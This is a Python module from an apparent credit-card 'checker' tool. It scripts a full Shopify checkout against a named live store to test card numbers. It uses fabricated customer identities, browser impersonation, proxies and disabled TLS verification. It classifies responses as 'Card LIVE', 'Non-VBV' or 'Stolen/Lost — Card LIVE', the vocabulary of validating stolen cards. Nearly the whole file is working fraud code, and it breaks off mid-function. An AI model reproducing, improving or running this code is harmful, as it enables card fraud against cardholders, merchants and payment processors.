"""
gateways/shopify_gate.py — Shopify Payments CC Checker

CONFIRMED WORKING FLOW (live-tested 2026-07-03):
  Store: brio4life.com | Endpoint: /checkouts/internal/graphql/persisted

  1. cartCreate + cartBuyerIdentityUpdate (Storefront API)
       → Gets cart_id + delivery handle
  2. GET /checkout
       → x-checkout-one-session-token (auth for internal GQL)
       → checkout_id (source token)
  3. POST checkout.pci.shopifyinc.com/sessions
       → vault card → payment_session_id (vault_id)
  4. POST /checkouts/internal/graphql/persisted?operationName=SubmitForCompletion
       → SubmitSuccess (receipt_id inside response)
  5. POST /checkouts/internal/graphql/persisted?operationName=PollForReceipt
       → ProcessedReceipt → APPROVED
       → FailedReceipt     → DECLINED / 3DS / Insufficient
"""
import asyncio
import json
import logging
import random
import re
import uuid
import html as html_module

import aiohttp
from aiohttp import ClientTimeout, CookieJar

from gateways.base import GatewayResult, CCStatus
from core.parser import CardData
import config

logger = logging.getLogger("CC-Checker.Shopify")

TIMEOUT          = ClientTimeout(total=30)
VAULT_TIMEOUT    = ClientTimeout(total=15)
CHECKOUT_TIMEOUT = ClientTimeout(total=20)
POLL_TIMEOUT     = ClientTimeout(total=15)

# ── Persisted query IDs (from checkout-web build) ─────────────────────────────
SUBMIT_QUERY_ID = "d175350fa2abc713b3171bd7eee3d6443861a7c884298fde2bea9d60abbebcf6"
POLL_QUERY_ID   = "cb31a1b2197416d7441bf789defc306069c385c558764a58648f18cba899a29a"

DEFAULT_STORES = [
    {
        "base_url":          "https://www.brio4life.com",
        "variant_id":        41675869487181,
        "price":             "6.95",
        "currency":          "USD",
        "payment_method_id": "dc2c83c064fc75ebc5dfa2b5bee4f873",
        # delivery_handle intentionally omitted — always fetched fresh per-session
    },
]

FAKE_CUSTOMERS = [
    {
        "email":     "james.wilson42@gmail.com",
        "firstName": "James", "lastName": "Wilson",
        "address1":  "New York Ave", "address2": "",
        "city":      "Hudson",  "state": "WY",
        "zip":       "82515",   "country": "US",
        "phone":     "7584578457",
    },
    {
        "email":     "sarah.jones88@gmail.com",
        "firstName": "Sarah", "lastName": "Jones",
        "address1":  "456 Oak Ave", "address2": "",
        "city":      "New York", "state": "NY",
        "zip":       "10001",    "country": "US",
        "phone":     "2125550456",
    },
    {
        "email":     "mike.brown55@gmail.com",
        "firstName": "Michael", "lastName": "Brown",
        "address1":  "789 Pine Rd", "address2": "",
        "city":      "Chicago", "state": "IL",
        "zip":       "60601",   "country": "US",
        "phone":     "3125550789",
    },
]

BROWSER_HEADERS = {
    "User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
    "sec-ch-ua":        '"Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
}


# ── Helpers ───────────────────────────────────────────────────────────────────

def _err(msg: str, code: str) -> GatewayResult:
    return GatewayResult(status=CCStatus.ERROR, gateway="Shopify", message=msg, raw_code=code)

def _extract_meta(html: str, name: str) -> str | None:
    """Extract serialized meta tag value from checkout HTML."""
    for pat in [
        rf'name=["\']serialized-{re.escape(name)}["\'][^>]+content=["\']([^"\'{{}}]{{5,800}})["\']',
        rf'content=["\']([^"\'{{}}]{{5,800}})["\'][^>]+name=["\']serialized-{re.escape(name)}["\']',
    ]:
        m = re.search(pat, html)
        if m:
            val = html_module.unescape(m.group(1)).strip()
            return val[1:-1] if (val.startswith('"') and val.endswith('"')) else val or None
    return None

async def _gql(session, ep, query, variables=None, headers=None, proxy_kwargs=None):
    """Storefront GraphQL call."""
    h = {**BROWSER_HEADERS, "Accept": "application/json", "Content-Type": "application/json"}
    if headers:
        h.update(headers)
    payload = {"query": query}
    if variables:
        payload["variables"] = variables
    try:
        pk = proxy_kwargs or {}
        async with session.post(ep, json=payload, headers=h, ssl=False, timeout=TIMEOUT, **pk) as r:
            txt = await r.text(errors="ignore")
            try:
                return r.status, json.loads(txt)
            except Exception:
                return r.status, {"raw": txt[:300]}
    except Exception as e:
        return 0, {"error": str(e)}



def _extract_unique_id(html: str) -> str:
    """
    Extract Shopify's unique_id from the identification JWT embedded in checkout HTML.
    This ID is the prefix of the full delivery handle.
    Format: {unique_id}-{rate_handle}
    """
    import base64 as _b64
    jwts = re.findall(r'eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+', html)
    for jwt in jwts:
        try:
            parts = jwt.split(".")
            pad   = parts[1] + "=" * (4 - len(parts[1]) % 4)
            payload = json.loads(_b64.b64decode(pad))
            uid = payload.get("unique_id", "")
            if uid and len(uid) == 32:
                return uid
        except Exception:
            pass
    return ""


# ── Main flow ─────────────────────────────────────────────────────────────────

async def _try_shopify_payments(
    session: aiohttp.ClientSession,
    card: CardData,
    store: dict,
    customer: dict,
    proxy: str = None,
) -> GatewayResult:
    """
    Full Shopify checkout flow using /checkouts/internal/graphql/persisted.
    """
    base_url         = store["base_url"]
    variant_id       = store["variant_id"]
    price            = store["price"]
    currency         = store.get("currency", "USD")
    pay_method_id    = store.get("payment_method_id", "dc2c83c064fc75ebc5dfa2b5bee4f873")
    # storefront_token from scan_data (if available) for authenticated GQL calls
    storefront_token = store.get("storefront_token", "")
    domain           = base_url.replace("https://www.", "").replace("https://", "")

    # Setup proxy kwargs for HTTP requests
    proxy_kwargs = {}
    if proxy and not proxy.startswith("socks"):
        proxy_kwargs = {"proxy": proxy}

    # ALWAYS fetch fresh delivery handle — stored handles expire per checkout session
    delivery_handle  = ""

    sf_ep = f"{base_url}/api/2024-01/graphql.json"
    sf_h  = {**BROWSER_HEADERS, "Accept": "application/json", "Content-Type": "application/json"}
    if storefront_token:
        sf_h["X-Shopify-Storefront-Access-Token"] = storefront_token

    stable_id = str(uuid.uuid4())



    # ── Step 1: Add to cart ───────────────────────────────────────────────────
    logger.debug("Adding to cart...")
    try:
        async with session.post(
            base_url + "/cart/add.js",
            data=f"id={variant_id}&quantity=1",
            headers={**BROWSER_HEADERS,
                     "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                     "Accept": "application/json",
                     "X-Requested-With": "XMLHttpRequest",
                     "Referer": base_url + "/"},
            ssl=False, timeout=TIMEOUT,
            **proxy_kwargs
        ) as r:
            if r.status not in (200, 201):
                return _err(f"Cart add failed: {r.status}", "cart_error")
    except Exception as e:
        return _err(f"Cart error: {str(e)[:60]}", "cart_exception")


    # ── Step 2: Load checkout page ────────────────────────────────────────────
    logger.debug("Loading checkout page for session token + unique_id...")
    try:
        from curl_cffi.requests import AsyncSession as CurlAsyncSession
        
        # Extract cookies from aiohttp session
        cookies_dict = {}
        for cookie in session.cookie_jar:
            cookies_dict[cookie.key] = cookie.value
            
        proxy_url = proxy_kwargs.get("proxy")
        curl_proxies = {"http": proxy_url, "https": proxy_url} if proxy_url else None
        
        async with CurlAsyncSession(impersonate="chrome120", cookies=cookies_dict, timeout=20) as curl_s:
            r = await curl_s.get(
                base_url + "/checkout",
                params={"locale": "en"},
                headers={**BROWSER_HEADERS,
                         "Accept": "text/html,application/xhtml+xml,*/*;q=0.9",
                         "Referer": base_url + "/"},
                proxies=curl_proxies,
                allow_redirects=True
            )
            checkout_url  = str(r.url)
            checkout_html = r.text
            
            # Sync any new cookies back to aiohttp session
            for name, value in curl_s.cookies.items():
                session.cookie_jar.update_cookies({name: value})
                
    except Exception as e:
        logger.debug(f"Checkout page exception ({type(e).__name__}): {str(e)[:100]}")
        return _err(f"Checkout page error: {str(e)[:60]}", "checkout_exception")


    session_token = _extract_meta(checkout_html, "sessionToken")
    checkout_id   = _extract_meta(checkout_html, "sourceToken")
    if not checkout_id:
        m = re.search(r"/checkouts/cn/([a-zA-Z0-9]+)", checkout_url)
        checkout_id = m.group(1) if m else ""

    # Extract unique_id (used to compose full delivery handle)
    unique_id = _extract_unique_id(checkout_html)
    logger.debug(f"unique_id: {unique_id}")

    # Extract build_id from HTML
    m_build = (
        re.search(r'"x-checkout-web-build-id"\s*:\s*"([a-f0-9]{40})"', checkout_html) or
        re.search(r'buildId["\s:=]+["\']([a-f0-9]{40})["\']', checkout_html) or
        re.search(r'/assets/c1/[^"]+/([a-f0-9]{40})/', checkout_html) or
        re.search(r'checkout-web/assets/([a-f0-9]{8,40})', checkout_html)
    )
    build_id = m_build.group(1) if m_build else "629a7d0a1d675e5c3b08a3e62d6818fb3e014528"

    if not session_token:
        return _err("No session token (checkout needs JS)", "no_session_token")
    if not checkout_id:
        return _err("No checkout ID", "no_checkout_id")

    # Extract cart key from cookie jar for same-session delivery rates
    import urllib.parse as _urlparse
    cart_token_with_key = ""
    try:
        for cookie in session.cookie_jar:
            if cookie.key == "cart":
                val = _urlparse.unquote(cookie.value)
                if "?key=" in val:
                    cart_token_with_key = val
                    break
    except Exception:
        pass

    # ── Step 3: Get delivery handle — ALWAYS FETCH FRESH (handles expire) ──────
    # Delivery handles are checkout-session-specific and expire in minutes.
    # We MUST use the current session's cart cookie — never use a stored handle.
    logger.debug("Fetching rate handle from checkout cart...")

    cart_gid = ""
    if cart_token_with_key:
        cart_gid = f"gid://shopify/Cart/{cart_token_with_key}"
    else:
        # Fallback: create new cart via Storefront API
        _, dc = await _gql(session, sf_ep, """
mutation cartCreate($input: CartInput!) {
  cartCreate(input: $input) { cart { id } userErrors { message } }
}""", {"input": {"lines": [{"merchandiseId": f"gid://shopify/ProductVariant/{variant_id}", "quantity": 1}]}}, headers=sf_h, proxy_kwargs=proxy_kwargs)
        cart_gid = ((dc.get("data") or {}).get("cartCreate") or {}).get("cart", {}).get("id", "")
        logger.debug(f"Fallback cartCreate: {cart_gid[:40] if cart_gid else 'FAILED'}")

    if cart_gid:
        # cartBuyerIdentityUpdate with address → triggers delivery groups
        _, d2 = await _gql(session, sf_ep, """
mutation cartBuyerIdentityUpdate($cartId: ID!, $buyerIdentity: CartBuyerIdentityInput!) {
  cartBuyerIdentityUpdate(cartId: $cartId, buyerIdentity: $buyerIdentity) {
    cart {
      deliveryGroups(first: 5) {
        nodes {
          deliveryOptions { handle title code }
        }
      }
    }
    userErrors { message }
  }
}""", {
            "cartId": cart_gid,
            "buyerIdentity": {
                "email":       customer["email"],
                "countryCode": "US",
                "deliveryAddressPreferences": [{
                    "deliveryAddress": {
                        "firstName": customer["firstName"],
                        "lastName":  customer["lastName"],
                        "address1":  customer["address1"],
                        "city":      customer["city"],
                        "province":  customer["state"],
                        "zip":       customer["zip"],
                        "country":   "US",
                    }
                }]
            }
        }, headers=sf_h, proxy_kwargs=proxy_kwargs)
        nodes = (((d2.get("data") or {}).get("cartBuyerIdentityUpdate") or {})
                 .get("cart", {}).get("deliveryGroups", {}).get("nodes") or [])
        if nodes:
            opts = nodes[0].get("deliveryOptions") or []
            if opts:
                rate_handle = opts[0].get("handle", "")
                # Compose full handle: unique_id-rate_handle
                if unique_id and rate_handle:
                    delivery_handle = f"{unique_id}-{rate_handle}"
                elif rate_handle:
                    delivery_handle = rate_handle
                logger.debug(f"delivery_handle: {delivery_handle[:50]}...")

    if not delivery_handle:
        return _err("No shipping rates available for this store", "no_delivery")


    # ── Step 3: Vault card ────────────────────────────────────────────────────
    logger.debug("Vaulting card...")
    try:
        async with session.post(
            "https://checkout.pci.shopifyinc.com/sessions",
            json={
                "credit_card": {
                    "number":             card.number,
                    "name":               f"{card.first_name} {card.last_name}" if hasattr(card, 'first_name') else "John Doe",
                    "month":              int(card.month),
                    "year":               int(card.year),
                    "verification_value": card.cvv,
                    "start_month":        None,
                    "start_year":         None,
                    "issue_number":       "",
                },
                "payment_session_scope": domain,
            },
            headers={
                "Authorization":  f'Bearer "{session_token}"',
                "Content-Type":   "application/json",
                "Accept":         "application/json",
                "Origin":         "https://checkout.pci.shopifyinc.com",
                "Referer":        "https://checkout.pci.shopifyinc.com/build/52416cb/number-ltr.html",
                "User-Agent":     BROWSER_HEADERS["User-Agent"],
            },
            ssl=False, timeout=VAULT_TIMEOUT,
            **proxy_kwargs
        ) as r:
            vj = await r.json(content_type=None)
    except Exception as e:
        return _err(f"Vault error: {str(e)[:60]}", "vault_exception")

    vault_id = vj.get("id", "")
    if not vault_id:
        if vj.get("error_codes"):
            return GatewayResult(
                status=CCStatus.DEAD, gateway="Shopify",
                message=f"Declined — {vj['error_codes'][0]}",
                raw_code="vault_declined"
            )
        return _err(f"Vault failed: {str(vj)[:80]}", "vault_error")

    # ── Step 4: Build headers for internal GQL ────────────────────────────────
    internal_ep = f"{base_url}/checkouts/internal/graphql/persisted"
    internal_headers = {
        **BROWSER_HEADERS,
        "Accept":                          "application/json",
        "Accept-Language":                 "en",
        "Content-Type":                    "application/json",
        "Origin":                          base_url,
        "Referer":                         f"{base_url}/checkouts/cn/{checkout_id}/en/payment?skip_shop_pay=true",
        "sec-fetch-dest":                  "empty",
        "sec-fetch-mode":                  "cors",
        "sec-fetch-site":                  "same-origin",
        "shopify-checkout-client":         "checkout-web/1.0",
        "shopify-checkout-source":         f'id="{checkout_id}", type="cn"',
        "x-checkout-one-session-token":    session_token,
        "x-checkout-web-build-id":         build_id,
        "x-checkout-web-deploy-stage":     "production",
        "x-checkout-web-server-handling":  "fast",
        "x-checkout-web-server-rendering": "yes",
        "x-checkout-web-source-id":        checkout_id,
    }

    # ── Step 5: SubmitForCompletion ───────────────────────────────────────────
    logger.debug("Submitting for completion...")
    attempt_token = f"{checkout_id}-{uuid.uuid4().hex[:12]}"

    billing_addr = {
        "address1":    customer["address1"],
        "address2":    customer.get("address2", ""),
        "city":        customer["city"],
        "countryCode": customer["country"],
        "postalCode":  customer["zip"],
        "firstName":   customer["firstName"],
        "lastName":    customer["lastName"],
        "zoneCode":    customer["state"],
        "phone":       customer["phone"],
    }

    submit_payload = {
        "variables": {
            "input": {
                "sessionInput": {"sessionToken": session_token},
                "discounts":    {"lines": [], "acceptUnexpectedDiscounts": True},
                "delivery": {
                    "deliveryLines": [{
                        "destination": {"streetAddress": {**billing_addr, "oneTimeUse": False}},
                        "selectedDeliveryStrategy": {
                            "deliveryStrategyByHandle": {
                                "handle":           delivery_handle,
                                "customDeliveryRate": False,
                            },
                            "options": {"phone": customer["phone"]},
                        },
                        "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]},
                        "deliveryMethodTypes":    ["SHIPPING"],
                        "expectedTotalPrice":     {"any": True},
                        "destinationChanged":     False,
                    }],
                    "noDeliveryRequired":          [],
                    "useProgressiveRates":         True,
                    "prefetchShippingRatesStrategy": None,
                    "interfaceFlow":               "SHOPIFY",
                    "supportsSplitShipping":       True,
                },
                "merchandise": {
                    "merchandiseLines": [{
                        "stableId": stable_id,
                        "merchandise": {
                            "productVariantReference": {
                                "id":              f"gid://shopify/ProductVariantMerchandise/{variant_id}",
                                "variantId":       f"gid://shopify/ProductVariant/{variant_id}",
                                "properties":      [],
                                "sellingPlanId":   None,
                                "sellingPlanDigest": None,
                            }
                        },
                        "quantity":            {"items": {"value": 1}},
                        "expectedTotalPrice":  {"value": {"amount": price, "currencyCode": currency}},
                        "lineComponentsSource": None,
                        "lineComponents":      [],
                    }]
                },
                "memberships": {"memberships": []},
                "payment": {
                    "totalAmount": {"any": True},
                    "paymentLines": [{
                        "paymentMethod": {
                            "directPaymentMethod": {
                                "paymentMethodIdentifier": pay_method_id,
                                "sessionId":               vault_id,
                                "billingAddress":          {"streetAddress": billing_addr},
                                "cardSource":              None,
                            },
                            "giftCardPaymentMethod":              None,
                            "redeemablePaymentMethod":            None,
                            "walletPaymentMethod":                None,
                            "walletsPlatformPaymentMethod":       None,
                            "localPaymentMethod":                 None,
                            "paymentOnDeliveryMethod":            None,
                            "paymentOnDeliveryMethod2":           None,
                            "manualPaymentMethod":                None,
                            "customPaymentMethod":                None,
                            "offsitePaymentMethod":               None,
                            "customOnsitePaymentMethod":          None,
                            "deferredPaymentMethod":              None,
                            "customerCreditCardPaymentMethod":    None,
                            "paypalBillingAgreementPaymentMethod": None,
                            "remotePaymentInstrument":            None,
                        },
                        "amount": {"any": True},
                    }],
                    "billingAddress": {"streetAddress": billing_addr},
                    "creditCardBin":  card.number[:8],
                },
                "buyerIdentity": {
                    "customer":      {"presentmentCurrency": currency, "countryCode": "US"},
                    "email":         customer["email"],
                    "emailChanged":  False,
                    "phoneCountryCode": "US",
                    "marketingConsent": [{"email": {"consentState": "GRANTED", "value": customer["email"]}}],
                    "rememberMe":    False,
                    "setShippingAddressAsDefault": False,
                },
                "tip":     {"tipLines": []},
                "taxes": {
                    "proposedAllocations":        None,
                    "proposedTotalAmount":         {"any": True},
                    "proposedTotalIncludedAmount": None,
                    "proposedMixedStateTotalAmount": None,
                    "proposedExemptions":          [],
                },
                "note":                  {"message": None, "customAttributes": []},
                "localizationExtension": {"fields": []},
                "nonNegotiableTerms":    None,
                "scriptFingerprint": {
                    "signature": None, "signatureUuid": None,
                    "lineItemScriptChanges": [], "paymentScriptChanges": [],
                    "shippingScriptChanges": [],
                },
                "optionalDuties": {"buyerRefusesDuties": False},
                "cartMetafields":  [],
            },
            "attemptToken": attempt_token,
            "metafields":   [],
            "postPurchaseInquiryResult": "DECLINED",
            "analytics": {
                "requestUrl": f"{base_url}/checkouts/cn/{checkout_id}/en/payment?skip_shop_pay=true",
                "pageId":     str(uuid.uuid4()).upper(),
            },
        },
        "operationName": "SubmitForCompletion",
        "id": SUBMIT_QUERY_ID,
    }

    async def _do_submit(payload: dict) -> tuple[int, dict]:
        try:
            async with session.post(
                internal_ep,
                params={"operationName": "SubmitForCompletion"},
                json=payload,
                headers=internal_headers,
                ssl=False, timeout=TIMEOUT,
                **proxy_kwargs
            ) as r:
                txt = await r.text(errors="ignore")
                return r.status, json.loads(txt) if txt.strip().startswith("{") else {}
        except Exception as e:
            return 0, {"_exc": str(e)}

    # ── Shot 1: First submit ─────────────────────────────────────────────────
    logger.debug("SubmitForCompletion — shot 1 (probe session state)...")
    status1, sj1 = await _do_submit(submit_payload)

    if sj1.get("_exc"):
        return _err(f"Submit error: {sj1['_exc'][:60]}", "submit_exception")
    if not sj1:
        return _err("Submit empty response", "submit_exception")

    gql_errors = sj1.get("errors", [])
    if gql_errors:
        msg = gql_errors[0].get("message", "GQL error") if isinstance(gql_errors[0], dict) else str(gql_errors[0])
        return _err(f"Submit GQL error: {msg[:80]}", "gql_error")

    data1  = sj1.get("data", {}) or {}
    result = data1.get("submitForCompletion", {}) or {}
    typ    = result.get("__typename", "")

    logger.debug(f"Shot1: {typ}")

    # Handle SubmitRejected — extract correct IDs + wait for pending terms
    if typ == "SubmitRejected":
        seller   = result.get("sellerProposal") or {}
        rej_errs = result.get("errors") or []

        # Check error codes
        err_codes = {e.get("code", "") for e in rej_errs if isinstance(e, dict)}
        logger.debug(f"SubmitRejected codes: {err_codes}")

        # Hard failures — don't retry with any card on this store
        hard_fails = {"CHECKOUT_BLOCKED", "INVALID_PAYMENT", "PAYMENT_BLOCKED"}
        if err_codes & hard_fails:
            return _err(f"Checkout blocked: {', '.join(err_codes & hard_fails)}", "no_payment")

        # PAYMENTS_CREDIT_CARD_BASE_EXPIRED = card is expired
        if "PAYMENTS_CREDIT_CARD_BASE_EXPIRED" in err_codes:
            return _err("Card Expired", "no_payment")

        # DELIVERY_NO_DELIVERY_STRATEGY = store has no US shipping configured for this product
        if "DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE_FOR_MERCHANDISE_LINE" in err_codes:
            return _err("Store has no delivery strategy for this address", "no_payment")

        # DELIVERY_DELIVERY_LINE_DETAIL_CHANGED = the delivery rate handle changed or needs an update
        if "DELIVERY_DELIVERY_LINE_DETAIL_CHANGED" in err_codes:
            try:
                delivery_groups = (seller.get("delivery") or {}).get("deliveryGroups") or []
                if delivery_groups:
                    opts = delivery_groups[0].get("deliveryOptions") or []
                    if opts:
                        new_handle = opts[0].get("handle", "")
                        if new_handle:
                            logger.debug(f"Delivery rate changed — auto-correcting to {new_handle[:30]}...")
                            try:
                                submit_payload["variables"]["input"]["delivery"]["deliveryLines"][0]["selectedDeliveryStrategy"]["deliveryStrategyByHandle"]["handle"] = new_handle
                            except (KeyError, IndexError):
                                pass
            except Exception:
                pass

        # MERCHANDISE_EXPECTED_PRICE_MISMATCH = product price changed since scan
        # Auto-correct: extract actual price from sellerProposal and update payload
        if "MERCHANDISE_EXPECTED_PRICE_MISMATCH" in err_codes:
            try:
                merch_lines = (seller.get("merchandise") or {}).get("merchandiseLines") or []
                if merch_lines:
                    actual_price = (merch_lines[0].get("totalAmount") or {}).get("amount", "")
                    actual_currency = (merch_lines[0].get("totalAmount") or {}).get("currencyCode", "USD")
                    if actual_price:
                        logger.debug(f"Price mismatch — auto-correcting to {actual_price} {actual_currency}")
                        submit_payload["variables"]["input"]["merchandise"]["merchandiseLines"][0]["expectedTotalPrice"] = {
                            "value": {"amount": actual_price, "currencyCode": actual_currency}
                        }
            except Exception:
                pass

        # Extract correct paymentMethodIdentifier from sellerProposal
        avail_lines = (seller.get("payment") or {}).get("availablePaymentLines") or []
        for line in avail_lines:
            pm = (line.get("paymentMethod") or {})
            pmid = pm.get("paymentMethodIdentifier", "")
            pm_name = pm.get("name", "")
            if pmid and pm_name in ("shopify_payments", "credit_card", ""):
                if pmid != pay_method_id:
                    logger.debug(f"Correcting paymentMethodIdentifier: {pmid}")
                    pay_method_id = pmid
                    try:
                        submit_payload["variables"]["input"]["payment"][
                            "paymentLines"][0]["paymentMethod"][
                            "directPaymentMethod"]["paymentMethodIdentifier"] = pmid
                    except (KeyError, IndexError):
                        pass
                break

        # Check delivery pending terms
        delivery_seller = seller.get("delivery") or {}
        poll_ms = 0
        if delivery_seller.get("__typename") == "PendingTerms":
            poll_ms = delivery_seller.get("pollDelay", 1000)
            logger.debug(f"Delivery PendingTerms — waiting {poll_ms}ms...")
            await asyncio.sleep(poll_ms / 1000)

        # If non-recoverable errors remain — fail
        non_pending = err_codes - {
            "WAITING_PENDING_TERMS",
            "PAYMENTS_PROPOSED_GATEWAY_UNAVAILABLE",
            "MERCHANDISE_EXPECTED_PRICE_MISMATCH",  # handled above via auto-correct
            "DELIVERY_DELIVERY_LINE_DETAIL_CHANGED", # handled above via auto-correct
        }
        if non_pending:
            return _err(f"Submit rejected: {', '.join(non_pending)}", "no_payment")

        # ── Shot 2: Re-submit with corrected data ──────────────────────────
        logger.debug("SubmitForCompletion — shot 2 (with corrected data)...")
        _, sj2 = await _do_submit(submit_payload)

        if not sj2 or sj2.get("_exc"):
            return _err("Submit shot2 failed", "submit_exception")

        gql_err2 = sj2.get("errors", [])
        if gql_err2:
            msg2 = gql_err2[0].get("message", "") if isinstance(gql_err2[0], dict) else str(gql_err2[0])
            return _err(f"Shot2 GQL error: {msg2[:80]}", "gql_error")

        data2  = sj2.get("data", {}) or {}
        result = (data2.get("submitForCompletion") or {})
        typ    = result.get("__typename", "")
        logger.debug(f"Shot2: {typ}")

        if typ == "SubmitRejected":
            rej2 = result.get("errors") or []
            codes2 = {e.get("code", "") for e in rej2 if isinstance(e, dict)}
            return _err(f"SubmitRejected(2): {', '.join(codes2) or 'unknown'}", "no_payment")

    # ── Parse final result ─────────────────────────────────────────────────
    receipt_id = (
        result.get("receiptId") or
        result.get("attemptId") or
        (result.get("receipt") or {}).get("id") or
        ""
    )

    logger.debug(f"Final: {typ} | receipt={receipt_id[:40] if receipt_id else 'none'}")

    if typ not in ("SubmitSuccess", "SubmitAlreadyAccepted") and not receipt_id:
        if typ == "SubmitThrottled":
            return _err("Rate limited by Shopify", "throttled")
        if typ == "SubmitFailed":
            errs = result.get("errors", [])
            if errs:
                ec = errs[0].get("code", "") if isinstance(errs[0], dict) else ""
                em = errs[0].get("message", "") if isinstance(errs[0], dict) else str(errs[0])
                return _parse_submit_error(ec, em)
        return _err(f"Submit unexpected: {typ or submit_txt[:80]}", "no_payment")

    if not receipt_id:
        return _err("SubmitSuccess but no receipt_id", "no_receipt")

    # ── Step 6: PollForReceipt ────────────────────────────────────────────────
    logger.debug(f"Polling receipt: {receipt_id[:40]}...")

    poll_payload = {
        "variables": {
            "receiptId":    receipt_id,
            "sessionToken": session_token,
        },
        "operationName": "PollForReceipt",
        "id": POLL_QUERY_ID,
    }

    for attempt in range(8):
        await asyncio.sleep(2)
        try:
            async with session.post(
                internal_ep,
                params={"operationName": "PollForReceipt"},
                json=poll_payload,
                headers=internal_headers,
                ssl=False, timeout=POLL_TIMEOUT,
                **proxy_kwargs
            ) as r:
                poll_txt = await r.text(errors="ignore")
        except Exception as e:
            logger.debug(f"Poll error attempt {attempt+1}: {e}")
            continue

        try:
            pj = json.loads(poll_txt)
        except Exception:
            continue

        receipt  = (pj.get("data") or {}).get("receipt", {}) or {}
        rec_type = receipt.get("__typename", "")

        logger.debug(f"Poll[{attempt+1}]: {rec_type}")

        if rec_type == "ProcessedReceipt":
            # Validate it's actually approved — check for processingError
            proc_error = receipt.get("processingError") or {}
            if proc_error and proc_error.get("code"):
                # ProcessedReceipt but with processing error = effective decline
                err_code = proc_error.get("code", "")
                err_msg  = proc_error.get("messageUntranslated", "") or proc_error.get("message", "")
                logger.debug(f"ProcessedReceipt with error: {err_code}")
                return _parse_failed_receipt(receipt)
            order_id = receipt.get("orderName") or receipt.get("id", "")
            if not order_id:
                # No order ID = receipt exists but no actual order placed = treat as error
                logger.debug("ProcessedReceipt but no orderName/id — treating as error")
                continue  # wait for next poll
            return GatewayResult(
                status=CCStatus.CHARGED, gateway="Shopify",
                message=f"Approved — Shopify Payments | Non-VBV | Order: {order_id}",
                is_non_vbv=True, raw_code="approved"
            )

        if rec_type == "FailedReceipt":
            return _parse_failed_receipt(receipt)

        if rec_type == "PendingReceipt":
            continue

        # Check raw for known keywords
        raw_l = poll_txt.lower()
        if "do_not_honor" in raw_l:
            return GatewayResult(
                status=CCStatus.DO_NOT_HONOR, gateway="Shopify",
                message="Bank Declined — Card LIVE [do_not_honor]",
                raw_code="do_not_honor"
            )
        if "insufficient" in raw_l:
            return GatewayResult(
                status=CCStatus.INSUFFICIENT, gateway="Shopify",
                message="Insufficient Funds — Card LIVE",
                raw_code="insufficient"
            )
        if "3d_secure" in raw_l or "redirect_to_acs" in raw_l:
            return GatewayResult(
                status=CCStatus.LIVE_VBV, gateway="Shopify",
                message="3DS Required — Card LIVE",
                is_vbv=True, raw_code="3ds"
            )
        if "declined" in raw_l:
            return GatewayResult(
                status=CCStatus.DEAD, gateway="Shopify",
                message="Declined — Card Dead",
                raw_code="declined"
            )

    return _err("Poll timeout — no result", "poll_timeout")


def _parse_failed_receipt(receipt: dict) -> GatewayResult:
    """Parse FailedReceipt to get card result."""
    proc_error = receipt.get("processingError") or {}
    error_code = proc_error.get("code", "") or ""
    error_msg  = proc_error.get("messageUntranslated", "") or proc_error.get("message", "") or ""

    errors_list = receipt.get("errors") or []
    if errors_list and isinstance(errors_list[0], dict):
        error_code = error_code or errors_list[0].get("code", "")
        error_msg  = error_msg  or errors_list[0].get("message", "")

    code_upper = (error_code + " " + error_msg).upper()

    if any(x in code_upper for x in ["INSUFFICIENT", "INSUFFICIENT_FUNDS", "NSF"]):
        return GatewayResult(
            status=CCStatus.INSUFFICIENT, gateway="Shopify",
            message="Insufficient Funds — Card LIVE",
            raw_code="insufficient"
        )
    if any(x in code_upper for x in ["3D", "3DS", "REDIRECT_TO_ACS", "SECURE_VALIDATION",
                                       "AUTHENTICATION", "VERIFY", "OTP_REQUIRED"]):
        return GatewayResult(
            status=CCStatus.LIVE_VBV, gateway="Shopify",
            message="3DS Required — Card LIVE",
            is_vbv=True, raw_code="3ds"
        )
    if any(x in code_upper for x in ["INCORRECT_CVC", "INCORRECT_PIN", "CVC_WRONG"]):
        return GatewayResult(
            status=CCStatus.LIVE_VBV, gateway="Shopify",
            message=f"Incorrect CVC — Card LIVE [{error_code or error_msg[:40]}]",
            raw_code="incorrect_cvc"
        )
    if "EXPIRED" in code_upper:
        return GatewayResult(
            status=CCStatus.LIVE_VBV, gateway="Shopify",
            message=f"Expired Card — Card LIVE [{error_code or error_msg[:40]}]",
            raw_code="expired_card"
        )
    if any(x in code_upper for x in ["STOLEN", "LOST", "PICKUP"]):
        return GatewayResult(
            status=CCStatus.PICKUP, gateway="Shopify",
            message=f"Stolen/Lost — Card LIVE [{error_code or 'pickup'}]",
            raw_code="stolen_card"
        )

    # Specific bank responses (bank knows the card) = LIVE
    if any(x in code_upper for x in ["DO_NOT_HONOR", "RESTRICTED_CARD", "BLOCKED", "FRAUD", "INVALID_CARD"]):
        display_msg = error_code or error_msg[:40] or "Bank Decline"
        return GatewayResult(
            status=CCStatus.DO_NOT_HONOR, gateway="Shopify",
            message=f"Bank Declined — Card LIVE [{display_msg}]",
            raw_code="do_not_honor"
        )

    # Generic/plain decline (no specific code) = DEAD
    if any(x in code_upper for x in ["GENERIC_ERROR", "CARD_DECLINED", "DECLINED"]):
        display_msg = error_code or error_msg[:40] or "Declined"
        return GatewayResult(
            status=CCStatus.DEAD, gateway="Shopify",
            message=f"Declined — {display_msg}",
            raw_code="declined"
        )

    # Has ANY specific error code but not mapped above = bank responded = LIVE
    if error_code or error_msg:
        return GatewayResult(
            status=CCStatus.DO_NOT_HONOR, gateway="Shopify",
            message=f"Bank Response — Card LIVE [{error_code or error_msg[:60]}]",
            raw_code="bank_response"
        )

    # No error info at all = DEAD
    return GatewayResult(
        status=CCStatus.DEAD, gateway="Shopify",
        message="Declined — No bank response",
        raw_code="declined"
    )


def _parse_submit_error(code: str, msg: str) -> GatewayResult:
    """Parse submit error codes."""
    c = (code + " " + msg).upper()
    if any(x in c for x in ["INCORRECT_CVC", "INCORRECT_PIN", "CVC_WRONG"]):
